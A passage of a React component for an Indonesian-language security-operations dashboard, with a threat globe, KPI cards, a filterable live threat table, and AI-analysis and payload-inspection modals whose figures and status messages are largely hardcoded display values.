                country: t.location.split(',')[1]?.trim() || 'Global',
                ip: t.ip,
                lat:
                  t.ip.startsWith('194') ? 50.11 :
                  t.ip.startsWith('185') ? 52.37 :
                  t.ip.startsWith('198') ? 39.04 :
                  t.ip.startsWith('91') ? 55.75 :
                  t.ip.startsWith('45') ? 1.35 :
                  t.ip.startsWith('103') ? -6.21 :
                  t.ip.startsWith('114') ? 3.59 : -7.25,
                lon:
                  t.ip.startsWith('194') ? 8.68 :
                  t.ip.startsWith('185') ? 4.89 :
                  t.ip.startsWith('198') ? -77.48 :
                  t.ip.startsWith('91') ? 37.62 :
                  t.ip.startsWith('45') ? 103.82 :
                  t.ip.startsWith('103') ? 106.85 :
                  t.ip.startsWith('114') ? 98.67 : 112.75,
                threatType: t.attackType,
                severity: t.severity,
              }))}
            />

            {/* FLOATING OVERLAY: Threat Activity Timeline (Left of Globe) */}
            <div className="absolute top-4 left-4 z-20 hidden md:block">
              <ThreatActivityTimeline />
            </div>

            {/* FLOATING OVERLAY: Bottom Prompt Bar ("Ask Threat Intelligence...") */}
            <div className="absolute bottom-4 inset-x-4 md:inset-x-8 z-20">
              <div className="p-2 sm:p-2.5 rounded-2xl bg-[#061b14]/90 border border-[#0e3b2c] backdrop-blur-xl shadow-[0_8px_32px_rgba(0,0,0,0.8)]">
                {/* Input row */}
                <form
                  onSubmit={(e) => {
                    e.preventDefault();
                    handleAskThreatIntelligence();
                  }}
                  className="flex items-center gap-2 px-2"
                >
                  <Sparkles size={16} className="text-cyan-400 shrink-0 animate-pulse" />
                  <input
                    type="text"
                    value={aiPromptInput}
                    onChange={(e) => setAiPromptInput(e.target.value)}
                    placeholder="Ask Threat Intelligence... (e.g. 'Analisis serangan DDoS', 'Mitigasi IP 194.26.29.112')"
                    className="w-full bg-transparent text-xs text-slate-100 placeholder-slate-400 focus:outline-none font-mono"
                  />
                  <button
                    type="button"
                    onClick={() => {
                      showToast('Fitur Voice Dictation siap menerima audio input!', 'info');
                    }}
                    className="p-1.5 rounded-lg text-slate-400 hover:text-cyan-300 transition-colors"
                    title="Voice Input"
                  >
                    <Mic size={15} />
                  </button>
                  <button
                    type="submit"
                    disabled={aiLoading}
                    className="p-1.5 rounded-xl bg-gradient-to-r from-cyan-500 to-emerald-500 hover:from-cyan-400 hover:to-emerald-400 text-slate-950 font-bold transition-all shadow-[0_0_12px_rgba(34,211,238,0.4)] disabled:opacity-50"
                    title="Kirim ke AI Security Analyst"
                  >
                    <Send size={14} className={aiLoading ? 'animate-spin' : ''} />
                  </button>
                </form>

                {/* Sub-Badges beneath Input */}
                <div className="flex flex-wrap items-center justify-between gap-2 pt-2 px-2 border-t border-[#0e3b2c]/60 mt-1.5 text-[10px] font-mono">
                  <div className="flex items-center gap-1.5">
                    <span className="px-2 py-0.5 rounded-lg bg-[#03140e] border border-emerald-500/40 text-emerald-300 flex items-center gap-1">
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping" />
                      My agent
                    </span>
                    <span className="px-2 py-0.5 rounded-lg bg-[#03140e] border border-cyan-500/40 text-cyan-300">
                      +3 DEFCON Models
                    </span>
                  </div>

                  <div className="flex items-center gap-1 text-slate-400">
                    <Bot size={13} className="text-cyan-400" />
                    <span>AI Security Analyst (Powered by Gemini AI)</span>
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* BOTTOM ROW (UNDER THE GLOBE): KPI Matrix & Load Sequence */}
          <div className="grid grid-cols-1 md:grid-cols-12 gap-6">
            {/* 4-Card KPI Matrix (Left Col 5) */}
            <div className="md:col-span-5 rounded-2xl bg-[#061b14]/90 border border-[#0e3b2c] p-4 backdrop-blur-xl shadow-lg grid grid-cols-2 gap-3 font-mono">
              {/* Metric 1: Security Score */}
              <div className="p-3 rounded-xl bg-[#03140e] border border-[#0e3b2c] flex flex-col justify-between">
                <span className="text-[11px] text-slate-400 uppercase tracking-wider">
                  Security Score
                </span>
                <div className="my-2 flex items-baseline gap-2">
                  <span className="text-2xl font-extrabold text-white">
                    {metrics.securityScore}%
                  </span>
                  <span className="text-[10px] text-emerald-400 font-bold">↑ +2.1%</span>
                </div>
                <div className="text-[9px] text-emerald-400/80 flex items-center gap-1">
                  <ShieldCheck size={11} className="text-emerald-400" />
                  <span>Optimal Defense</span>
                </div>
              </div>

              {/* Metric 2: Threats Blocked */}
              <div className="p-3 rounded-xl bg-[#03140e] border border-[#0e3b2c] flex flex-col justify-between">
                <span className="text-[11px] text-slate-400 uppercase tracking-wider">
                  Threats Blocked
                </span>
                <div className="my-2 flex items-baseline gap-2">
                  <span className="text-2xl font-extrabold text-white">
                    {metrics.totalBlocked.toLocaleString('id-ID')}
                  </span>
                  <span className="text-[10px] text-emerald-400 font-bold">↑ +312%</span>
                </div>
                <div className="text-[9px] text-cyan-400/80 flex items-center gap-1">
                  <Shield size={11} className="text-cyan-400" />
                  <span>100% Intercepted</span>
                </div>
              </div>

              {/* Metric 3: Protected Devices / Users */}
              <div className="p-3 rounded-xl bg-[#03140e] border border-[#0e3b2c] flex flex-col justify-between">
                <span className="text-[11px] text-slate-400 uppercase tracking-wider">
                  Protected Device
                </span>
                <div className="my-2 flex items-baseline gap-2">
                  <span className="text-2xl font-extrabold text-white">
                    {metrics.protectedDevices.toLocaleString('id-ID')}
                  </span>
                  <span className="text-[10px] text-emerald-400 font-bold">↑ +18%</span>
                </div>
                <div className="text-[9px] text-slate-400 flex items-center gap-1">
                  <Server size={11} className="text-emerald-400" />
                  <span>Active Endpoints</span>
                </div>
              </div>

              {/* Metric 4: Active Incidents */}
              <div className="p-3 rounded-xl bg-[#03140e] border border-[#0e3b2c] flex flex-col justify-between">
                <span className="text-[11px] text-slate-400 uppercase tracking-wider">
                  Active Incidents
                </span>
                <div className="my-2 flex items-baseline gap-2">
                  <span className="text-2xl font-extrabold text-white">
                    {metrics.activeIncidents}
                  </span>
                  <span className="text-[10px] text-cyan-400 font-bold">↓ -312%</span>
                </div>
                <div className="text-[9px] text-amber-400/80 flex items-center gap-1">
                  <Activity size={11} className="text-amber-400" />
                  <span>Contained</span>
                </div>
              </div>
            </div>

            {/* Load Sequence Scrubber Chart (Right Col 7) */}
            <div className="md:col-span-7">
              <LoadSequenceWidget />
            </div>
          </div>
        </div>

        {/* RIGHT COLUMN (Col 4): SOC Intelligence Suite */}
        <div className="lg:col-span-4">
          <SocIntelligenceSuite
            activeThreatCount={983}
            totalEventsCount="983,421"
            matrixData={{
              highRisk: 89,
              medium: 215,
              low: 1203,
              resolved: 532,
            }}
            confidenceScores={{
              malware: 97,
              anomaly: 94,
              attribution: 89,
            }}
          />
        </div>
      </div>

      {/* LIVE INCIDENT FEED TABLE & FORENSIC CONSOLE (Expanded Below) */}
      <section className="rounded-2xl bg-[#05140d]/90 border border-[#0e3b2c] backdrop-blur-xl shadow-xl overflow-hidden font-mono">
        {/* Table Toolbar */}
        <div className="p-5 border-b border-[#0e3b2c] flex flex-col md:flex-row md:items-center md:justify-between gap-4">
          <div>
            <div className="flex items-center gap-2">
              <Crosshair size={18} className="text-rose-500 animate-pulse" />
              <h2 className="font-heading font-bold text-base text-white tracking-wide">
                Live Cyber Threat Stream
              </h2>
              <span className="text-[10px] font-mono px-2 py-0.5 rounded-full bg-rose-950 text-rose-300 border border-rose-800 font-bold">
                {filteredThreats.length} Active Events
              </span>
            </div>
            <p className="text-xs text-slate-400 mt-0.5 font-sans">
              Telemetri insiden keamanan L7, inspeksi payload forensik, mitigasi mitigasi WAF, dan isolasi IP penyerang
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-2.5">
            {/* Live stream pause/play */}
            <button
              onClick={() => {
                setLiveStreamActive((prev) => !prev);
                showToast(
                  !liveStreamActive
                    ? 'Live Inbound Stream Serangan: Diaktifkan'
                    : 'Live Inbound Stream Serangan: Dijeda (Paused)',
                  'info'
                );
              }}
              className={`px-3 py-1.5 rounded-xl border text-xs font-mono flex items-center gap-1.5 transition-all ${
                liveStreamActive
                  ? 'bg-emerald-950/80 border-emerald-500/50 text-emerald-300 shadow-[0_0_12px_rgba(16,185,129,0.3)]'
                  : 'bg-slate-900 border-slate-700 text-slate-400'
              }`}
            >
              <span
                className={`w-2 h-2 rounded-full ${
                  liveStreamActive ? 'bg-emerald-400 animate-ping' : 'bg-slate-500'
                }`}
              />
              <span>{liveStreamActive ? 'Live Inbound: Active' : 'Live: Paused'}</span>
            </button>

            {/* Attack Type Filter */}
            <select
              value={selectedTypeFilter}
              onChange={(e) => setSelectedTypeFilter(e.target.value)}
              className="bg-[#061b14] border border-[#0e3b2c] text-slate-200 text-xs rounded-xl px-2.5 py-1.5 focus:outline-none focus:border-cyan-500 cursor-pointer"
            >
              <option value="ALL">Semua Tipe Serangan</option>
              <option value="Flooding/DDoS">Flooding/DDoS</option>
              <option value="SQL Injection">SQL Injection</option>
              <option value="XSS Probe">XSS Probe</option>
              <option value="Brute Force">Brute Force</option>
              <option value="Unauthorized Scan">Unauthorized Scan</option>
            </select>

            {/* Severity Filter */}
            <select
              value={selectedSeverityFilter}
              onChange={(e) => setSelectedSeverityFilter(e.target.value)}
              className="bg-[#061b14] border border-[#0e3b2c] text-slate-200 text-xs rounded-xl px-2.5 py-1.5 focus:outline-none focus:border-cyan-500 cursor-pointer"
            >
              <option value="ALL">Semua Severity</option>
              <option value="CRITICAL">Critical Only</option>
              <option value="HIGH">High Severity</option>
              <option value="MEDIUM">Medium Severity</option>
            </select>

            {/* Link to Geo-Traffic Nusantara */}
            {setActiveTab && (
              <button
                onClick={() => setActiveTab('admin-geotraffic')}
                className="px-3 py-1.5 rounded-xl bg-cyan-950/60 border border-cyan-500/40 text-cyan-300 hover:bg-cyan-900/60 text-xs font-semibold flex items-center gap-1.5 transition-all shadow-[0_0_15px_rgba(6,182,212,0.2)]"
              >
                <Globe size={14} className="text-cyan-400" />
                <span>Geo-Traffic Radar</span>
                <ArrowUpRight size={12} />
              </button>
            )}
          </div>
        </div>

        {/* Table Content */}
        <div className="overflow-x-auto">
          <table className="w-full text-left text-xs border-collapse">
            <thead>
              <tr className="border-b border-[#0e3b2c] bg-[#03140e]/70 text-slate-400 font-mono text-[11px] uppercase tracking-wider">
                <th className="py-3.5 px-4">Waktu &amp; ID</th>
                <th className="py-3.5 px-4">Tipe Serangan &amp; Severity</th>
                <th className="py-3.5 px-4">IP &amp; Daerah Asal</th>
                <th className="py-3.5 px-4">Endpoint &amp; Payload Terdeteksi</th>
                <th className="py-3.5 px-4">Status Aksi</th>
                <th className="py-3.5 px-4 text-right">Tindakan Pertahanan</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-[#0e3b2c]/60 font-mono">
              {filteredThreats.length === 0 ? (
                <tr>
                  <td colSpan={6} className="py-12 text-center text-slate-500">
                    <ShieldCheck size={32} className="mx-auto mb-2 text-emerald-500/60" />
                    Tidak ada log serangan yang cocok dengan kriteria filter saat ini.
                  </td>
                </tr>
              ) : (
                filteredThreats.map((threat) => {
                  const isCrit = threat.severity.toUpperCase() === 'CRITICAL';
                  const isHigh = threat.severity.toUpperCase() === 'HIGH';

                  return (
                    <tr
                      key={threat.id}
                      className="hover:bg-[#061b14]/70 transition-colors group"
                    >
                      {/* 1. Time & ID */}
                      <td className="py-3.5 px-4 whitespace-nowrap">
                        <div className="font-bold text-slate-200">{threat.id}</div>
                        <div className="text-[10px] text-slate-500 flex items-center gap-1 mt-0.5">
                          <Clock size={10} />
                          <span>{threat.timestamp}</span>
                        </div>
                      </td>

                      {/* 2. Type & Severity */}
                      <td className="py-3.5 px-4 whitespace-nowrap">
                        <div className="flex items-center gap-2">
                          <span
                            className={`px-2 py-0.5 rounded text-[10px] font-bold uppercase tracking-wider border ${
                              isCrit
                                ? 'bg-rose-950/90 text-rose-300 border-rose-500/80 shadow-[0_0_12px_rgba(244,63,94,0.35)] animate-pulse'
                                : isHigh
                                ? 'bg-amber-950/90 text-amber-300 border-amber-500/70'
                                : 'bg-cyan-950/90 text-cyan-300 border-cyan-500/70'
                            }`}
                          >
                            {threat.severity}
                          </span>
                          <span className="font-semibold text-slate-200 text-xs">
                            {threat.attackType}
                          </span>
                        </div>
                      </td>

                      {/* 3. IP, Location & ASN */}
                      <td className="py-3.5 px-4 whitespace-nowrap">
                        <div className="flex items-center gap-1.5 font-bold text-slate-100">
                          <span>{threat.ip}</span>
                          <button
                            onClick={() => handleCopyIp(threat.ip)}
                            className="text-slate-500 hover:text-white transition-colors"
                            title="Salin IP"
                          >
                            {copiedIp === threat.ip ? (
                              <Check size={12} className="text-emerald-400" />
                            ) : (
                              <Copy size={12} />
                            )}
                          </button>
                        </div>
                        <div className="text-[10px] text-slate-400 flex items-center gap-1 mt-0.5">
                          <Globe size={11} className="text-cyan-400" />
                          <span>{threat.location}</span>
                        </div>
                        <div className="text-[9px] text-slate-500">{threat.asn}</div>
                      </td>

                      {/* 4. Target & Payload */}
                      <td className="py-3.5 px-4 max-w-xs md:max-w-md">
                        <div className="text-slate-300 font-bold truncate">
                          {threat.target}
                        </div>
                        <div
                          onClick={() => setSelectedThreatModal(threat)}
                          className="text-[11px] text-rose-300/90 bg-rose-950/30 border border-rose-900/40 rounded px-2 py-1 mt-1 truncate cursor-pointer hover:border-rose-500/60 transition-all font-mono"
                          title="Klik untuk membuka inspeksi payload forensik mendalam"
                        >
                          {threat.payload}
                        </div>
                      </td>

                      {/* 5. Action Status */}
                      <td className="py-3.5 px-4 whitespace-nowrap">
                        <span
                          className={`inline-flex items-center gap-1 px-2.5 py-1 rounded-full text-[10px] font-bold border ${
                            threat.isBlocked
                              ? 'bg-rose-950/80 text-rose-300 border-rose-600/70 shadow-[0_0_8px_rgba(244,63,94,0.25)]'
                              : 'bg-emerald-950/80 text-emerald-300 border-emerald-600/70 shadow-[0_0_8px_rgba(16,185,129,0.25)]'
                          }`}
                        >
                          {threat.isBlocked ? (
                            <ShieldBan size={11} className="text-rose-400" />
                          ) : (
                            <ShieldCheck size={11} className="text-emerald-400" />
                          )}
                          <span>{threat.status}</span>
                        </span>
                      </td>

                      {/* 6. Defense Actions */}
                      <td className="py-3.5 px-4 whitespace-nowrap text-right">
                        <div className="flex items-center justify-end gap-1.5">
                          <button
                            onClick={() => setSelectedThreatModal(threat)}
                            className="p-1.5 rounded-lg bg-[#061b14] hover:bg-[#0e3b2c] border border-[#0e3b2c] text-slate-300 hover:text-white transition-colors"
                            title="Inspeksi Forensik Payload"
                          >
                            <Eye size={13} />
                          </button>

                          <button
                            onClick={() => handleToggleBlockIp(threat.id, threat.isBlocked, threat.ip)}
                            className={`px-2.5 py-1 rounded-lg text-xs font-bold transition-all flex items-center gap-1 ${
                              threat.isBlocked
                                ? 'bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700'
                                : 'bg-rose-600 hover:bg-rose-500 text-white shadow-[0_0_10px_rgba(225,29,72,0.3)]'
                            }`}
                          >
                            {threat.isBlocked ? (
                              <>
                                <Unlock size={12} />
                                <span>Buka Blokir</span>
                              </>
                            ) : (
                              <>
                                <Lock size={12} />
                                <span>Blokir IP</span>
                              </>
                            )}
                          </button>
                        </div>
                      </td>
                    </tr>
                  );
                })
              )}
            </tbody>
          </table>
        </div>
      </section>

      {/* AI THREAT INTELLIGENCE ANALYSIS MODAL */}
      {aiAnalysisModal && (
        <div className="fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-center justify-center p-4">
          <div className="bg-[#05140d] border border-cyan-500/50 rounded-2xl max-w-2xl w-full p-6 shadow-[0_0_50px_rgba(6,182,212,0.3)] space-y-4 font-mono text-slate-200">
            {/* Header */}
            <div className="flex items-center justify-between pb-3 border-b border-[#0e3b2c]">
              <div className="flex items-center gap-2">
                <Bot size={22} className="text-cyan-400 animate-pulse" />
                <div>
                  <h3 className="font-heading font-bold text-base text-white">
                    AI Threat Intelligence Analyst
                  </h3>
                  <span className="text-[10px] text-cyan-400 font-mono">
                    POWERED BY GEMINI AI • DEFCON INTELLIGENCE SUITE
                  </span>
                </div>
              </div>
              <button
                onClick={() => setAiAnalysisModal(null)}
                className="text-slate-400 hover:text-white p-1 rounded-lg"
              >
                <X size={18} />
              </button>
            </div>

            {/* Query Pill */}
            <div className="p-3 rounded-xl bg-[#03140e] border border-[#0e3b2c] text-xs">
              <span className="text-slate-400 block text-[10px] uppercase">Query Admin:</span>
              <span className="text-cyan-300 font-bold">{aiAnalysisModal.query}</span>
            </div>

            {/* AI Body */}
            {aiAnalysisModal.status === 'analyzing' ? (
              <div className="py-12 text-center space-y-3">
                <div className="w-10 h-10 border-2 border-cyan-400 border-t-transparent rounded-full animate-spin mx-auto" />
                <p className="text-xs text-slate-300 font-mono">
                  Menjalankan Deep Threat Packet Correlation &amp; Evaluasi MITRE ATT&amp;CK...
                </p>
              </div>
            ) : (
              <div className="p-4 rounded-xl bg-[#03140e] border border-[#0e3b2c] max-h-96 overflow-y-auto text-xs space-y-3 font-mono leading-relaxed text-slate-300 whitespace-pre-line">
                {aiAnalysisModal.response}
              </div>
            )}

            {/* Footer */}
            <div className="flex items-center justify-between pt-3 border-t border-[#0e3b2c] text-xs">
              <span className="text-[10px] text-slate-500 font-mono">
                Timestamp: {aiAnalysisModal.timestamp} • Gateway Enforced
              </span>
              <button
                onClick={() => setAiAnalysisModal(null)}
                className="px-4 py-2 rounded-xl bg-cyan-600 hover:bg-cyan-500 text-slate-950 font-bold transition-all shadow-[0_0_12px_rgba(6,182,212,0.4)]"
              >
                Selesai / Tutup
              </button>
            </div>
          </div>
        </div>
      )}

      {/* DEEP PACKET INSPECTION FORENSIC MODAL */}
      {selectedThreatModal && (
        <div className="fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-center justify-center p-4">
          <div className="bg-[#05140d] border border-rose-500/40 rounded-2xl max-w-2xl w-full p-6 shadow-[0_0_50px_rgba(244,63,94,0.25)] space-y-4 font-mono text-slate-200">
            <div className="flex items-center justify-between pb-3 border-b border-[#0e3b2c]">
              <div className="flex items-center gap-2">
                <ShieldAlert size={20} className="text-rose-500" />
                <h3 className="font-heading font-bold text-base text-white">
                  Inspeksi Forensik Payload Ancaman ({selectedThreatModal.id})
                </h3>
              </div>
              <button
                onClick={() => setSelectedThreatModal(null)}
                className="text-slate-400 hover:text-white p-1 rounded-lg"
              >
                <X size={18} />
              </button>
            </div>

            <div className="space-y-3 text-xs">
              <div className="grid grid-cols-2 gap-3 bg-[#03140e] p-3 rounded-xl border border-[#0e3b2c]">
                <div>
                  <span className="text-slate-500 block text-[10px]">IP PENYERANG:</span>
                  <span className="text-slate-100 font-bold">{selectedThreatModal.ip}</span>
                </div>
                <div>
                  <span className="text-slate-500 block text-[10px]">LOKASI &amp; ASN:</span>
                  <span className="text-slate-100">{selectedThreatModal.location} ({selectedThreatModal.asn})</span>
                </div>
                <div>
                  <span className="text-slate-500 block text-[10px]">TIPE ANCAMAN:</span>
                  <span className="text-rose-400 font-bold">{selectedThreatModal.attackType} ({selectedThreatModal.severity})</span>
                </div>
                <div>
                  <span className="text-slate-500 block text-[10px]">TARGET URI:</span>
                  <span className="text-cyan-300 font-bold">{selectedThreatModal.target}</span>
                </div>
              </div>

              <div>
                <span className="text-slate-400 text-xs font-bold block mb-1">
                  DEEP PACKET INSPECTION RAW PAYLOAD:
                </span>
                <div className="p-3.5 rounded-xl bg-[#03140e] border border-rose-900/60 text-rose-300 font-mono text-xs overflow-x-auto whitespace-pre-wrap select-all">
                  {selectedThreatModal.payload}
                </div>
              </div>

              <div className="p-3 rounded-xl bg-emerald-950/40 border border-emerald-500/30 text-emerald-300 text-xs">
                <span className="font-bold block mb-0.5">Status Penanganan Gateway:</span>
                Payload berhasil diisolasi oleh layer WAF Bionet tanpa menyentuh core database PostgreSQL atau session cache.
              </div>
            </div>

            <div className="flex items-center justify-between pt-3 border-t border-[#0e3b2c]">
              <button
                onClick={() => handleCopyIp(selectedThreatModal.ip)}
                className="px-3 py-1.5 rounded-xl bg-[#061b14] border border-[#0e3b2c] text-slate-300 hover:text-white text-xs flex items-center gap-1.5"
              >
                <Copy size={13} />
                <span>Salin IP</span>
              </button>
              <div className="flex items-center gap-2">
                <button
                  onClick={() => {
                    handleToggleBlockIp(
                      selectedThreatModal.id,
                      selectedThreatModal.isBlocked,
                      selectedThreatModal.ip
                    );
                    setSelectedThreatModal((prev) => ({
                      ...prev,
                      isBlocked: !prev.isBlocked,
                    }));
                  }}
                  className={`px-4 py-2 rounded-xl text-xs font-bold transition-all ${
                    selectedThreatModal.isBlocked
                      ? 'bg-slate-800 text-slate-300 hover:bg-slate-700'
                      : 'bg-rose-600 text-white hover:bg-rose-500 shadow-[0_0_12px_rgba(225,29,72,0.4)]'
                  }`}
                >
                  {selectedThreatModal.isBlocked ? 'Buka Blokir IP Ini' : 'Blokir Permanen IP Ini'}
                </button>
                <button
                  onClick={() => setSelectedThreatModal(null)}
                  className="px-4 py-2 rounded-xl bg-[#061b14] border border-[#0e3b2c] text-slate-300 hover:text-white text-xs"
                >
                  Tutup
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
